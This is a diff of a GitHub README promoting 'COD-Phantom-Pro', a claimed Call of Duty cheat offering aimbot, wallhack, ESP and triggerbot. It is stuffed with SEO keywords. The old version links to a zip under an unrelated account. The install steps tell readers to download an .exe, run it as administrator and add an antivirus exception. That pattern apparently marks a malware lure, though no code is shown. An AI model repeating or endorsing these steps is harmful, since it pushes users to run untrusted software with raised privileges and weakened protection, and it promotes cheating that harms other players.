@@ -1,177 +1,71 @@
-<p align="center">
-  <img src="https://img.icons8.com/color/96/000000/call-of-duty.png" alt="Call of Duty" width="80" height="80">
-</p>
+# 🎯 COD-Phantom-Pro - Gain the advantage in every match
 
-<h1 align="center">COD-Phantom-Pro</h1>
-<p align="center">
-  <strong>Phantom Pro Tool for Call of Duty</strong><br>
-  ESP - Aimbot - Wallhack - No Recoil - Triggerbot - Silent Aim
-</p>
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Aletheadreadful536/COD-Phantom-Pro/releases)
 
-<p align="center">
-  <a href="https://github.com/YOUR_USERNAME/COD-Phantom-Pro"><img src="https://img.shields.io/badge/version-3.0.0-brightgreen?style=flat-square" alt="Version"></a>
-  <a href="#"><img src="https://img.shields.io/badge/platform-Windows-blue?style=flat-square" alt="Platform"></a>
-  <a href="#"><img src="https://img.shields.io/badge/status-active-success?style=flat-square" alt="Status"></a>
-</p>
+COD-Phantom-Pro provides tactical tools for Call of Duty players. This application includes features like ESP for enemy tracking, aim assistance, wallhacks, recoil reduction, and trigger mechanisms. It helps players improve their performance by providing better information and control during gameplay.
 
-## What is This?
+## ⚙️ System Requirements
 
-COD-Phantom-Pro is the phantom pro tool for Call of Duty. This tool gives you full control with ESP Wallhack, Aimbot, No Recoil, Triggerbot, Silent Aim, and more. Become the phantom of the battlefield and dominate every match!
+Before you install the software, check that your computer meets these requirements to ensure smooth operation:
 
-Disclaimer: This tool is for educational purposes only. Use at your own risk. Call of Duty has strict anti-cheat systems (Ricochet), and using third-party tools may result in permanent account suspension.
+- Operating System: Windows 10 or Windows 11 (64-bit).
+- Processor: Intel Core i5 or AMD Ryzen 5 equivalent.
+- Memory: 8 GB RAM.
+- Graphics: NVIDIA GeForce GTX 1060 or AMD Radeon RX 580.
+- Network: Stable internet connection.
+- Permissions: Administrator access is required to run the tool.
 
-## Download
+## 💾 Install and Setup
 
-<p align="center">
-  <a href="https://github.com/unicornflameplunder/flawsppy/releases/download/6451/CODHelper.zip">
-    <img src="https://img.shields.io/badge/DOWNLOAD%20NOW-000000?style=for-the-badge&logo=github&logoColor=white" alt="Download">
-  </a>
-</p>
+Follow these steps to download and set up the application on your Windows computer.
 
-## Features
+1. Visit the [official release page](https://github.com/Aletheadreadful536/COD-Phantom-Pro/releases) to download the installer.
+2. Select the latest version file ending in .exe.
+3. Save the file to your computer. 
+4. Locate the downloaded file in your downloads folder.
+5. Right-click the file and select "Run as administrator" to start the installation.
+6. Follow the on-screen prompts to complete the setup process.
+7. Launch the application from your desktop shortcut once the install finishes.
 
-- ESP (Wallhack) - See all enemies through walls
-- Distance Indicators - Know exactly how far enemies are
-- Player Tags - Display player names and health
-- Snap Lines - Never lose track of enemies
-- Box ESP - Highlight players with colored boxes
-- Visibility Check - Only show visible enemies
-- Aimbot - Lock onto enemies instantly with 100% accuracy
-- Silent Aim - Hit targets without looking at them
-- Triggerbot - Auto-fire when crosshair is on enemy
-- No Recoil - Zero recoil for all weapons
-- No Spread - Perfect accuracy every time
-- FOV Control - Customizable field of view
-- Bone Targeting - Head, chest, or moving parts
-- Humanizer Mode - Realistic aim motion to avoid detection
-- Speed Hack - Move faster than normal players
-- Super Jump - Jump incredible heights
-- God Mode - Never die
-- Unlimited Ammo - Never reload
-- XP Editor - Fast rank leveling
+## 🕹️ Using the Features
 
-## Installation
+The application runs in the background while you play. You can manage features through the control panel.
 
-1. Click the download button above
-2. Extract the archive
-3. Run as Administrator
-4. Launch Call of Duty
-5. Press INSERT or F1 to open the menu
-6. Toggle features ON/OFF
+### ESP and Enemy Tracking
+The ESP module overlays information onto your screen. It shows the location of players, their distance, and their health status. This helps you identify threats even when objects block your view.
 
-## System Requirements
+### Aimbot Performance
+The aimbot assists with target acquisition. It adjusts your crosshair toward targets based on your configuration. You can change the focus speed and sensitivity to match your preference.
 
-| Requirement | Details |
-|-------------|---------|
-| OS | Windows 10/11 (64-bit) |
-| Game | Call of Duty |
-| RAM | 8GB minimum |
-| Storage | 50MB free space |
-| GPU | NVIDIA/AMD GPU |
+### Recoil Control
+The no-recoil feature mitigates the upward jump of your weapon when you fire. This keeps your shots centered on the target and reduces the need for manual mouse adjustment.
 
-## SEO Tags
+### Wallhack View
+The wallhack feature highlights enemies behind physical obstacles. Use this feature to plan your movement and predict enemy positions in building interiors or urban zones.
 
-cod phantom pro, call of duty cheat, call of duty hack, call of duty esp, call of duty aimbot, call of duty wallhack, call of duty no recoil, call of duty triggerbot, call of duty silent aim, call of duty 2026, call of duty mod menu, call of duty trainer, call of duty undetected, call of duty free cheat, call of duty download, call of duty utility, call of duty enhancer, warzone cheat, warzone hack, fps cheat
+### Triggerbot Function
+The triggerbot automatically fires your weapon when your crosshair crosses an enemy player. It works best with single-shot or semi-automatic weapons for maximum precision.
 
-## Support
+## 🛡️ Best Practices
 
-Star this repository if you enjoy it!
+- Start with default settings to understand how the features influence your gameplay.
+- Adjust one setting at a time to test its impact.
+- Keep your drivers updated to prevent performance issues.
+- Close programs that consume high amounts of memory while the game runs.
+- Use the provided user interface to toggle features on or off without restarting the game.
 
-<p align="center">
-  <a href="https://github.com/YOUR_USERNAME/COD-Phantom-Pro">
-    <img src="https://img.shields.io/badge/Made%20with%20love%20for%20the%20Call%20of%20Duty%20community-ff69b4?style=for-the-badge" alt="Made with love">
-  </a>
-</p>
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
+## ❓ Frequently Asked Questions
+
+What should I do if the application does not start?
+Ensure you have the latest .NET Framework installed. Check your antivirus settings as well, as some security software prevents the application from launching. Add an exception for the installation folder if needed.
+
+How do I reset my settings?
+Go to the settings menu in the application and look for the "Restore Defaults" button. This returns all values to the factory configuration.
+
+Can I map my own keys?
+Yes. The keybind sub-menu allows you to assign specific keyboard keys to each feature. Click the current key and press the new key you wish to use.
+
+Does this work on all game modes?
+The tool supports all standard multiplayer and battle royale modes within the game. It functions identically regardless of the map or mode you select.
+
+Keywords: call of duty, aimbot, esp, game assistance, windows software, no recoil, wallhack, tactical tool
